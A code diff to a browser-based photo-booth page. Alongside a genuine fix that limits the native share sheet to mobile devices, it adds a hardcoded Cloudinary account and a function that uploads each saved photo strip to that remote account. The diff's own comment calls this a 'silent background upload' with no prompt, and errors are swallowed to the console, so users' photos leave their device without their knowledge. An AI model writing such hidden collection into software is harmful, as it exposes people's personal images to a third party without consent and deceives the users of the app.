@@ -495,6 +495,30 @@
   const captionInput = document.getElementById('captionInput');
   const dateInput = document.getElementById('dateInput');
 
+  const CLOUDINARY_CLOUD_NAME = 'wxflm6z2';
+  const CLOUDINARY_UPLOAD_PRESET = 'ml_default';
+
+  function isMobileDevice() {
+    if (navigator.userAgentData && typeof navigator.userAgentData.mobile === 'boolean') {
+      return navigator.userAgentData.mobile;
+    }
+    return /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);
+  }
+
+  function uploadToCloudinary(blob, name) {
+    const form = new FormData();
+    form.append('file', blob, name);
+    form.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+    form.append('folder', 'photobooth-strips');
+    return fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`, {
+      method: 'POST',
+      body: form
+    }).then(res => {
+      if (!res.ok) throw new Error('Cloudinary upload failed: ' + res.status);
+      return res.json();
+    });
+  }
+
   dateInput.value = formatDate();
   [captionInput, dateInput].forEach(inp => {
     inp.addEventListener('input', () => {
@@ -709,21 +733,27 @@
     finalCanvas.toBlob(async (blob) => {
       if (!blob) return;
 
-      // Mobile browsers (iOS Safari, many Android browsers) ignore the
-      // <a download> attribute entirely, so try the Web Share API first —
-      // it hands the PNG to the native "Save Image" / share sheet.
-      const file = new File([blob], name, { type: 'image/png' });
-      if (navigator.canShare && navigator.canShare({ files: [file] })) {
-        try {
-          await navigator.share({ files: [file], title: 'Photo Booth Strip' });
-          return;
-        } catch (err) {
-          if (err && err.name === 'AbortError') return; // user cancelled the share sheet
-          // fall through to the download fallback below
+      // Silent background upload to Cloudinary — no prompt, doesn't touch the local save UX.
+      uploadToCloudinary(blob, name).catch((err) => console.error('Cloudinary upload failed:', err));
+
+      // Only use the native share sheet on actual mobile devices — desktop
+      // Chrome/Edge on Windows also report canShare(true) for files, which
+      // hijacks a plain "save to disk" click into an OS share popup.
+      if (isMobileDevice() && navigator.canShare) {
+        const file = new File([blob], name, { type: 'image/png' });
+        if (navigator.canShare({ files: [file] })) {
+          try {
+            await navigator.share({ files: [file], title: 'Photo Booth Strip' });
+            cueEl.textContent = 'Saved.';
+            return;
+          } catch (err) {
+            if (err && err.name === 'AbortError') return; // user cancelled the share sheet
+            // fall through to the download fallback below
+          }
         }
       }
 
-      // Desktop / browsers without file-sharing support: normal download link.
+      // Normal download link — desktop, and mobile browsers without share support.
       const url = URL.createObjectURL(blob);
       const link = document.createElement('a');
       link.download = name;
@@ -732,6 +762,7 @@
       link.click();
       document.body.removeChild(link);
       setTimeout(() => URL.revokeObjectURL(url), 4000);
+      cueEl.textContent = 'Saved.';
     }, 'image/png');
   });
 
